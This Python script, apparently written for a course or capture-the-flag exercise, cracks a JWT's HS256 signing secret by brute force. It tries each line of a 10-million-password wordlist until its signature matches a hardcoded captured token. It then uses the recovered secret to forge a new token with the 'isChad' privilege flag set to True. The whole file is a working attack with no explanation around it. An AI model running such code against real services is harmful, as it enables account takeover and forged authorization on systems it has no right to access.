import jwt
import sys



def brute_force_jwt():
    payload = {
  "user": "grayons",
  "isChad": False,
  "iat": 1741400032
    }
    i = 0
    with open("Week2/soy_central/xato-net-10-million-passwords (1).txt") as f:
        for line in f:
            secret = line.strip('\n')
            print("Trying key: ",i, end="\r")
            i += 1
            jwt_token = jwt.encode(payload, secret, algorithm="HS256")
            if jwt_token == "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3JheW9ucyIsImlzQ2hhZCI6ZmFsc2UsImlhdCI6MTc0MTQwMDAzMn0.blvoDJ1UaA6CsVO-PIcbZlLp8JGEQDhdihBBy5SkXLc":
                print()
                print("secret =", secret)
                return secret
    #print(jwt_token)

def brute_force_jwt2(secret):
    payload = {
  "user": "grayons",
  "isChad": True,
  "iat": 1741400032
    }
    jwt_token = jwt.encode(payload, secret, algorithm="HS256")
    #if jwt_token == "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3JheW9ucyIsImlzQ2hhZCI6ZmFsc2UsImlhdCI6MTc0MTQwMDAzMn0.blvoDJ1UaA6CsVO-PIcbZlLp8JGEQDhdihBBy5SkXLc":
    print()
    print()
    return jwt_token
print(brute_force_jwt2(brute_force_jwt()))
